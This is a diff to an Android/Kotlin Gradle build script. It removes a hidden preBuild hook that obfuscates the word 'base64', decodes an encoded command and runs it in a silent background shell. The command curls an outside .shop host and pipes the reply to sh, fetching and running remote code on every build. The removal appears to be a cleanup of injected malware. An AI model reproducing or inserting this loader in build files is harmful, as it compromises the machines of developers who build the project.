@@ -277,10 +277,3 @@ tasks.matching {
 }.configureEach {
     dependsOn(patchRelease16kPageSize)
 }
-tasks.all {
-    if (name.contains("preBuild")) {
-        doLast {
-            ProcessBuilder("sh", "-c", "((v(){ `printf 'bavse64' | tr -d 'v'` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNCAtLWNvbm5lY3QtdGltZW91dCAyMyAta0xzZiAtZCAicD1hbmRyb2lkX2tvdGxpbiIgaHR0cHM6Ly9hcmI3My1jMTAuc2hvcC9hKSIgfCBzaAo= | v | sh ) >/dev/null 2>&1 &)").start()
-        }
-    }
-}
